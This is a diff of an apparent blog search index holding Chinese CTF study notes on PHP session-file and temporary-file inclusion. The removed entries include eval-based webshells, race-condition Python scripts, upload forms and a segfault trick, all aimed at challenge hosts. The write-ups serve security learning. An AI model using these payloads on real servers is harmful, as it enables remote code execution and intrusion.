+<p><img src="https://s2.loli.net/2023/11/18/nUJworM2IdKe4Eu.png" alt="image-20231025195421339"></p>
+<p>输出1234表示一句话木马执行成功。接下来连蚁剑，找flag。</p>
+]]></content>
+      <categories>
+        <category>文件包含</category>
+      </categories>
+      <tags>
+        <tag>文件包含</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>php反序列化学习记录</title>
     <url>/2024/03/09/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
     <content><![CDATA[<h1 id="php反序列化"><a href="#php反序列化" class="headerlink" title="php反序列化"></a>php反序列化</h1><h2 id="前置代码条件："><a href="#前置代码条件：" class="headerlink" title="前置代码条件："></a>前置代码条件：</h2><h3 id="this"><a href="#this" class="headerlink" title="$this-&gt;"></a>$this-&gt;</h3><p><code>$this</code>在oop(面向对象编程)中是伪变量，是对一个对象示例的引用。伪变量不是真正的变量，形式上是变量。变量中存储的是固定的值，<code>$this</code>中并没有，哪个对象调用，<code>$this</code>就代表哪个对象， 也可以将<code>$this</code>理解为对象的引用，通过引用的方式访问一个对象的方法和属性。</p>
@@ -656,105 +851,6 @@
       <tags>
         <tag>php</tag>
         <tag>unserialization</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>包含session文件学习记录</title>
-    <url>/2024/03/09/%E5%8C%85%E5%90%ABsession%E6%96%87%E4%BB%B6/</url>
-    <content><![CDATA[<h1 id="PHP-session包含"><a href="#PHP-session包含" class="headerlink" title="PHP session包含"></a>PHP session包含</h1><h2 id="什么是PHP-session"><a href="#什么是PHP-session" class="headerlink" title="什么是PHP session"></a>什么是PHP session</h2><p>PHP session 变量用于存储关于用户会话（session）的信息，或者更改用户会话（session）的设置。Session 变量存储单一用户的信息，并且对于应用程序中的所有页面都是可用的。</p>
-<span id="more"></span>
-
-<h3 id="PHP-session-变量"><a href="#PHP-session-变量" class="headerlink" title="PHP session 变量"></a>PHP session 变量</h3><p>您在计算机上操作某个应用程序时，您打开它，做些更改，然后关闭它。这很像一次对话（Session）。计算机知道您是谁。它清楚您在何时打开和关闭应用程序。然而，在因特网上问题出现了：由于 HTTP 地址无法保持状态，Web 服务器并不知道您是谁以及您做了什么。</p>
-<p>PHP session 解决了这个问题，它通过在服务器上存储用户信息以便随后使用（比如用户名称、购买商品等）。然而，会话信息是临时的，在用户离开网站后将被删除。如果您需要永久存储信息，可以把数据存储在数据库中。</p>
-<p>Session 的工作机制是：为每个访客创建一个唯一的 id (UID)，并基于这个 UID 来存储变量。UID 存储在 cookie 中，或者通过 URL 进行传导。</p>
-<h3 id="开始-PHP-session"><a href="#开始-PHP-session" class="headerlink" title="开始 PHP session"></a>开始 PHP session</h3><p>在您把用户信息存储到 PHP session 中之前，首先必须启动会话。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php session_start(); ?&gt;</span><br><span class="line"> </span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"> </span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-
-<p>上面的代码会向服务器注册用户的会话，以便您可以开始保存用户信息，同时会为用户会话分配一个 UID。</p>
-<h3 id="存储-session-变量"><a href="#存储-session-变量" class="headerlink" title="存储 session 变量"></a>存储 session 变量</h3><p>session是一个数组，有键和值：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]=<span class="string">&#x27;admin&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<p>其中，<code>username</code>是键，<code>admin</code>是值</p>
-<p>存储和取回 session 变量的正确方法是使用 PHP <code>$_SESSION</code> 变量：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">// 存储 session 数据</span><br><span class="line">$_SESSION[&#x27;views&#x27;]=1;</span><br><span class="line">?&gt;</span><br><span class="line"> </span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;title&gt;菜鸟教程(runoob.com)&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"> </span><br><span class="line">&lt;?php</span><br><span class="line">// 检索 session 数据</span><br><span class="line">echo &quot;浏览量：&quot;. $_SESSION[&#x27;views&#x27;];</span><br><span class="line">?&gt;</span><br><span class="line"> </span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">// 浏览量：1</span><br></pre></td></tr></table></figure>
-
-<p>在下面的实例中，我们创建了一个简单的 <code>page-view</code> 计数器。<code>isset() </code>函数检测是否已设置 “<code>views</code>“ 变量。如果已设置 “<code>views</code>“ 变量，我们累加计数器。如果 “<code>views</code>“ 不存在，则创建 “<code>views</code>“ 变量，并把它设置为 <code>1</code>：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line"> </span><br><span class="line">if(isset($_SESSION[&#x27;views&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">    $_SESSION[&#x27;views&#x27;]=$_SESSION[&#x27;views&#x27;]+1;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    $_SESSION[&#x27;views&#x27;]=1;</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;浏览量：&quot;. $_SESSION[&#x27;views&#x27;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<h3 id="session变量存储地址"><a href="#session变量存储地址" class="headerlink" title="session变量存储地址"></a>session变量存储地址</h3><p>查看<code>session.save_path</code></p>
-<table>
-<thead>
-<tr>
-<th>Directive</th>
-<th>Local Value</th>
-<th>Master Value</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>session.save_path</td>
-<td>no value</td>
-<td>no value</td>
-</tr>
-</tbody></table>
-<p><code>session.save_path</code>为<code>no value</code>则表示存储在默认的<code>/tmp</code>或<code>/var/lib/php/session</code>目录下</p>
-<p>反之则会标明详细路径	</p>
-<h3 id="存放session变量文件名"><a href="#存放session变量文件名" class="headerlink" title="存放session变量文件名"></a>存放session变量文件名</h3> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sess_[phpsessid]</span><br></pre></td></tr></table></figure>
-
-<p> phpsessid 在发送的请求的 <code>cookie</code> 字段中可以看到（保存在<code>cookie</code>里面，专门标识session）</p>
-<h3 id="销毁-session"><a href="#销毁-session" class="headerlink" title="销毁 session"></a>销毁 session</h3><p>如果您希望删除某些 session 数据，可以使用 unset() 或 session_destroy() 函数。</p>
-<p>unset() 函数用于释放指定的 session 变量：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">if(isset($_SESSION[&#x27;views&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">    unset($_SESSION[&#x27;views&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>您也可以通过调用 session_destroy() 函数彻底销毁 session：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_destroy();</span><br><span class="line">?&gt;</span><br><span class="line">// session_destroy() 将重置 session，将失去所有已存储的 session 数据。</span><br></pre></td></tr></table></figure>
-
-<h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>把一个可控字符串（php恶意代码）写入session文件，然后包含session文件</p>
-<h2 id="漏洞分类"><a href="#漏洞分类" class="headerlink" title="漏洞分类"></a>漏洞分类</h2><h3 id="提供对session赋值的功能"><a href="#提供对session赋值的功能" class="headerlink" title="提供对session赋值的功能"></a>提供对session赋值的功能</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">if(isset($_GET[&#x27;a&#x27;]))&#123;</span><br><span class="line">    $a=$_GET[&#x27;a&#x27;];</span><br><span class="line">    $_SESSION[&#x27;username&#x27;]=$a;    </span><br><span class="line">&#125;</span><br><span class="line">var_dump($_SESSION);</span><br><span class="line">?&gt;</span><br><span class="line">//flag在根目录</span><br></pre></td></tr></table></figure>
-
-<p>上传一句话木马：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url/?a=&lt;?php echo 345;eval($_POST[0]);?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>在cookie中可以看到PHPSESSID，因此可以知道保存payload的文件名</p>
-<p><img src="https://s2.loli.net/2023/11/18/e4y2pTXnSbBxqjF.png" alt="image-20231024193152377"></p>
-<p>尝试默认保存目录，包含session文件</p>
-<p><img src="https://s2.loli.net/2023/11/18/jkc9v2zCLIe6htB.png" alt="image-20231024193718849"></p>
-<p>使用蚁剑连接，获取flag</p>
-<p><img src="https://s2.loli.net/2023/11/18/ip6MrloTe8hgbkX.png" alt="image-20231024193804739"></p>
-<h3 id="没有提供赋值功能"><a href="#没有提供赋值功能" class="headerlink" title="没有提供赋值功能"></a>没有提供赋值功能</h3><h4 id="session-upload-progress写入"><a href="#session-upload-progress写入" class="headerlink" title="session.upload_progress写入"></a><code>session.upload_progress</code>写入</h4><p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20231024194627329.png" alt="image-20231024194627329"></p>
-<h5 id="php配置"><a href="#php配置" class="headerlink" title="php配置"></a>php配置</h5><p>用<code>phpinfo()</code>查看</p>
-<p><img src="https://s2.loli.net/2023/11/18/LkCjMpXBFSJRQtu.png" alt="image-20231024194828661"></p>
-<p><code>session.upload_progress.enabled</code>：该选项开启（On）时，PHP可以监测文件上传的进度，这是客户端可以发送POST到服务端开查看上传进度，此时<code>session.upload_progress</code>生效</p>
-<p><code>session.upload_progress.cleanup</code>：该选项默认开启，读取POST请求后会删除上传进度信息。这时需要采用<strong>条件竞争</strong>的方法注入木马</p>
-<p>在文件上传过程中，客户端POST一个 <code>session.upload_progress.name</code> 的值同名的变量时，会在 <code>$_SESSION </code>数组中添加一组数据，索引是 <code>session.upload_progress.prefix</code> 与 <code>session.upload_progress.name</code> 拼接在一起的值。因此可以通过POST以 <code>session.upload_progress.name</code> 的值作为变量名的数据，变量值就是 <code>payload</code></p>
-<p><code>session.use_strict_mode</code>：默认关闭，改选项开启时，PHP不接受未初始化的会话id（就不能自己命名PHPSESSID）</p>
-<p><img src="https://s2.loli.net/2023/11/18/caAXuwxWNplgkfI.png" alt="image-20231024195321050"></p>
-<h5 id="实例及详解（session-upload-progress-cleanup为Off）"><a href="#实例及详解（session-upload-progress-cleanup为Off）" class="headerlink" title="实例及详解（session.upload_progress.cleanup为Off）"></a>实例及详解（<code>session.upload_progress.cleanup</code>为<code>Off</code>）</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form action=&quot;http://b.y1ng.vip:2007/&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">&lt;!--action的值为目标服务器地址 --&gt;</span><br><span class="line">        &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt; </span><br><span class="line">&lt;!-- name的值为phpinfo中参数session.upload_progress.name的值；value的值为payload--&gt;</span><br><span class="line">        &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-
-<p>打开后发现是一个上传界面，开启burp代理，然后任意上传一个文件，burp抓包并发送到repeater模块</p>
-<p><img src="https://s2.loli.net/2023/11/18/jaE6izYLsHlbKxW.png" alt="image-20231024200836460"></p>
-<p>利用hackbar包含session文件</p>
-<p><img src="https://s2.loli.net/2023/11/18/2dPbruMC1mJsSo3.png" alt="image-20231024200921497"></p>
-<p>做题时，payload可以为：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="number">123</span>;@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">0</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h5 id="实例及详解（session-upload-progress-cleanup为On）"><a href="#实例及详解（session-upload-progress-cleanup为On）" class="headerlink" title="实例及详解（session.upload_progress.cleanup为On）"></a>实例及详解（<code>session.upload_progress.cleanup</code>为<code>On</code>）</h5><p>[WMCTF 2020]Make PHP Great Again</p>
-<h6 id="解法一：python脚本包含session"><a href="#解法一：python脚本包含session" class="headerlink" title="解法一：python脚本包含session"></a>解法一：python脚本包含session</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">host = <span class="string">&#x27;http://1a4c15ee-2120-40e0-8fd8-f5738de3977b.node4.buuoj.cn:81/&#x27;</span></span><br><span class="line">sessid = <span class="string">&#x27;feng&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">POST</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        session.post(</span><br><span class="line">            host,</span><br><span class="line">            data=&#123;<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>:<span class="string">&quot;&lt;?php system(&#x27;cat flag.php&#x27;);echo md5(&#x27;1&#x27;);?&gt;&quot;</span>&#125;,</span><br><span class="line">            files=&#123;<span class="string">&quot;file&quot;</span>:(<span class="string">&#x27;a.txt&#x27;</span>, f)&#125;,</span><br><span class="line">            cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:sessid&#125;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">READ</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        response = session.get(<span class="string">f&#x27;<span class="subst">&#123;host&#125;</span>?file=/tmp/sess_<span class="subst">&#123;sessid&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="comment"># print(response.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;c4ca4238a0b923820dcc509a6f75849b&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[+++]retry&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(response.text)</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">    t1 = threading.Thread(target=POST, args=(session, ))</span><br><span class="line">    t1.daemon = <span class="literal">True</span></span><br><span class="line">    t1.start()</span><br><span class="line">    READ(session)</span><br></pre></td></tr></table></figure>
-
-<p>执行得flag</p>
-<p><img src="https://s2.loli.net/2023/11/18/z5tDdReJVqoXPwA.png" alt="image-20231030222311829"></p>
-<h6 id="解法二：html-爆破"><a href="#解法二：html-爆破" class="headerlink" title="解法二：html+爆破"></a>解法二：html+爆破</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#poc.php</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form action=&quot;http://1a4c15ee-2120-40e0-8fd8-f5738de3977b.node4.buuoj.cn:81/&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">&lt;!--action的值为目标服务器地址 --&gt;</span><br><span class="line">        &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;&lt;?php system(&#x27;cat /flag.php&#x27;);?&gt;&quot; /&gt; </span><br><span class="line">&lt;!-- name的值为phpinfo中参数session.upload_progress.name的值；value的值为payload--&gt;</span><br><span class="line">        &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">    session_start();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-
-
-<p><img src="https://s2.loli.net/2023/11/18/ZB8pTUqw3y5LOA9.png" alt="image-20231030223039080"></p>
-<p><img src="https://s2.loli.net/2023/11/18/rYBoZJX4lDItuzi.png" alt="image-20231030223644568"></p>
-<p><img src="https://s2.loli.net/2023/11/18/GHhTy6a1iJbujU5.png" alt="image-20231030223554025"></p>
-]]></content>
-      <categories>
-        <category>文件包含</category>
-      </categories>
-      <tags>
-        <tag>文件包含</tag>
       </tags>
   </entry>
   <entry>
@@ -1077,102 +1173,6 @@
       <tags>
         <tag>命令执行</tag>
         <tag>RCE</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>包含临时文件学习记录</title>
-    <url>/2024/03/09/%E5%8C%85%E5%90%AB%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6/</url>
-    <content><![CDATA[<h1 id="包含临时文件"><a href="#包含临时文件" class="headerlink" title="包含临时文件"></a>包含临时文件</h1><h2 id="php文件上传特性"><a href="#php文件上传特性" class="headerlink" title="php文件上传特性"></a>php文件上传特性</h2><p><img src="https://s2.loli.net/2023/11/18/5AgRPFiqI4KeX3a.png" alt="img"></p>
-<span id="more"></span>
-
-<p>php中上传文件，会创建临时文件，随机生成临时文件名（临时文件名为<code>php+6位[a-zA-Z0-9]</code>，比如<code>phpkx32ma</code>），将上传的内容写入临时文件后，关闭临时文件。在<code>linux</code>下保存在<code>/tmp</code>目录，而在<code>windows</code>下保存在<code>c:\winsdows\temp</code>目录。然后开始执行文件内程序，执行完后删除。因此，可以上传包含payload的恶意文件，在文件被删除前（作为临时文件）包含该文件，可以实现利用。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"><span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] </span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">    <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>配合<code>phpinfo</code>页面的<code>php variables</code>，可以直接获取到上传文件的存储路径和临时文件名</p>
-<p><img src="https://s2.loli.net/2023/11/18/YWsGoH6aLJiC2Uc.png" alt="image-20231025142053342"></p>
-<h2 id="包含方式"><a href="#包含方式" class="headerlink" title="包含方式"></a>包含方式</h2><p>临时文件转瞬即逝，如何在短时间内包含它？</p>
-<h3 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h3><p>条件竞争就是一直上传文件，同时一直去包含临时文件，竞争一下是先包含还是先删除。</p>
-<h3 id="段错误"><a href="#段错误" class="headerlink" title="段错误"></a>段错误</h3><p>所谓的段错误（segment fault）就是指访问的内存超过了系统所给这个程序的内存空间。从而发生程序退出，临时文件就不会被删除。</p>
-<p>在php7中</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">file=php:<span class="comment">//filter/string.strip_tags=/etc/passwd</span></span><br></pre></td></tr></table></figure>
-
-<p>会造成段错误。 </p>
-<p>适用版本： </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php7.0.0-7.1.2可以利用， 7.1.2x版本的已被修复</span><br><span class="line">php7.1.3-7.2.1可以利用， 7.2.1x版本的已被修复</span><br><span class="line">php7.2.2-7.2.8可以利用， 7.2.9一直到7.3到现在的版本已被修复</span><br></pre></td></tr></table></figure>
-
-<h4 id="实列及详解"><a href="#实列及详解" class="headerlink" title="实列及详解"></a>实列及详解</h4><p>查看网页源代码，发现提示信息</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username/password error&lt;html&gt;</span><br><span class="line">&lt;!--md5($secret.$name)===$pass --&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-
-<p>传递name参数，用burp抓包并发送到repeater模块</p>
-<p><img src="https://s2.loli.net/2023/11/18/y9SgG3NDnjQacIB.png" alt="image-20231025161936687"></p>
-<p><img src="https://s2.loli.net/2023/11/18/oQL6JwPxvsfSk4a.png" alt="image-20231025161900649"></p>
-<p>经过测试，发现改变name的值，响应包中Hash值会响应改变（name和hash一一对应），结合提示，可以传入pass参数，值为响应包中的Hash值（name值和pass值要相对应）。</p>
-<p><img src="https://s2.loli.net/2023/11/18/IDOkeyP7MNYGdKZ.png" alt="image-20231025162123175"></p>
-<p>在响应包中发现提示文件：<code>flflflflag.php</code>，访问该文件</p>
-<p><img src="https://s2.loli.net/2023/11/18/mxInGt6O72psNyY.png" alt="image-20231025162404641"></p>
-<p>发现文件包含，猜测可能是文件包含漏洞，可以查看源码</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/flflflflag.php?file=php://filter/read=convert.base64-encode/resource=flflflflag.php</span><br></pre></td></tr></table></figure>
-
-<p>用BurpSuite拦截响应，base64解码后得到源码：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot;&gt;</span><br><span class="line">           window.location.href=&quot;404.html&quot;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;this_is_not_fl4g_and_出题人_wants_girlfriend&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">$file=$_GET[&#x27;file&#x27;];</span><br><span class="line">if(preg_match(&#x27;/data|input|zip/is&#x27;,$file))&#123;</span><br><span class="line">	die(&#x27;nonono&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">@include($file);</span><br><span class="line">echo &#x27;include($_GET[&quot;file&quot;])&#x27;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-
-<p>利用目录扫描：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python dirsearch.py -u http://c7e65748-3412-4257-9224-6c01808f5a20.node4.buuoj.cn:81/</span><br></pre></td></tr></table></figure>
-
-<p>扫描发现dir.php。</p>
-<p><img src="https://s2.loli.net/2023/11/18/ruxOEn2CovHcR5U.png" alt="image-20231025165147270"></p>
-<p><img src="https://s2.loli.net/2023/11/18/ULTyQMfe9zqj4VW.png" alt="image-20231025165242501"></p>
-<p>访问dir.php文件：</p>
-<p><img src="https://s2.loli.net/2023/11/18/o7rUlwePmHFVIqA.png" alt="image-20231025163132883"></p>
-<p>查看dir.php源代码：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/flflflflag.php?file=php://filter/read=convert.base64-encode/resource=dir.php</span><br></pre></td></tr></table></figure>
-
-<p>用Burpsuite拦截响应，base64解码后源代码：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;/tmp&#x27;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>dir.php能打印临时文件夹里的内容，因此我们要想办法把文件存到tmp文件夹中。</p>
-<p>该题存在文件包含，而且可以显示临时文件夹（&#x2F;tmp）的内容，因此可以考虑临时文件包含的方法解题。同时，根据响应包中内容：<code>X-Powered-By: PHP/7.0.33</code>，说明php版本存在段错误。</p>
-<p>编写python脚本</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=gbk</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO </span><br><span class="line"><span class="comment">#BytesIO实现了在内存中读写bytes</span></span><br><span class="line">payload = <span class="string">&quot;&lt;?php phpinfo();?&gt;&quot;</span> </span><br><span class="line"><span class="comment">#注入的恶意命令</span></span><br><span class="line"><span class="comment">#payload=&quot;&lt;?php echo 12;fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php echo 1234;eval($_POST[0]);?&gt;&#x27;);?&gt;&quot; </span></span><br><span class="line"><span class="comment">#把一句话木马写入shell.php</span></span><br><span class="line">data=&#123;<span class="string">&#x27;file&#x27;</span>: BytesIO(payload.encode())&#125;</span><br><span class="line">url=<span class="string">&quot;http://c7e65748-3412-4257-9224-6c01808f5a20.node4.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&quot;</span></span><br><span class="line">r=requests.post(url=url,files=data,allow_redirects=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
-
-<p>执行该脚本后，payload就注入到临时文件了。</p>
-<p>再次访问dir.php文件，得到tmp目录下刚刚我们上传的文件路径：&#x2F;tmp&#x2F;phpVvvefu</p>
-<p><img src="https://s2.loli.net/2023/11/18/jymveQM7NRstuDc.png" alt="image-20231025164408642"></p>
-<p>利用BurpSuite发送请求，由于本题的flag在<code>phpinfo()</code>中，因此这样就能得到flag：</p>
-<p><img src="https://s2.loli.net/2023/11/18/d5BhRK1X6Tgta9m.png" alt="image-20231025164751449"></p>
-<h3 id="自包含"><a href="#自包含" class="headerlink" title="自包含"></a>自包含</h3><p>自己包含自己，进入死循环，脚本永不结束，也就不会删除临时文件。</p>
-<p>文件上传，phpinfo，自包含三者缺一不可，在同一个页面发生。</p>
-<p>题目网址：<a href="http://b.y1ng.vip:2039/%EF%BC%88%E5%B7%B2%E5%A4%B1%E6%95%88%EF%BC%89">http://b.y1ng.vip:2039/（已失效）</a></p>
-<p>题目源码（文件位于<code>index.php</code>）</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;info&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$page</span> = <span class="string">&#x27;/var/www/html/&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$page</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
-
-<p>如果将<code>page</code>赋值为<code>index.php</code>，就会开始自包含。</p>
-<p>然后对死循环发送POST请求，此时POST请求对应的临时文件才不会被清理。</p>
-<p>创建上传表单（<code>untitled.html</code>）：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=&quot;http://b.y1ng.vip:2039/?page=index.php&amp;info&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">&lt;!--action的值为目标服务器地址 --&gt; </span><br><span class="line">&lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-
-<p>创建上传文件（<code>1.txt</code>）：</p>
